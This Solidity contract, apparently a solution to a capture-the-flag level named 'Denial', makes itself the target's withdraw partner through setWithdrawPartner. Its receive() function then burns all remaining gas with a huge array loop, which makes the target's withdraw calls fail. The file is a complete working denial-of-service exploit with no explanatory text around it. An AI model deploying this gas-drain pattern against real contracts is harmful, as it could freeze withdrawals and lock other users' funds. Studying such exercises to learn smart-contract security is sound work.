pragma solidity ^0.8.0;

contract GasDrainAttackerFinal {
    address public denial;

    constructor(address payable _denial) {
        denial = _denial;
    }

    function setPartnerFinal() external {
        (bool success, ) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(success, "Failed to set partner");
    }

    receive() external payable {
        // Create a very gas-intensive array allocation
        uint256[] memory a = new uint256[](1000000000);
        a[0] = 1; // Initial assignment
        for (uint256 i = 1; i < 1000000000; i++) {
            a[i] = i*a[i-1]; // Intensive gas-consuming array update
        }
    }

    fallback() external payable {
        // This should not be executed in Denial's withdraw
    }

}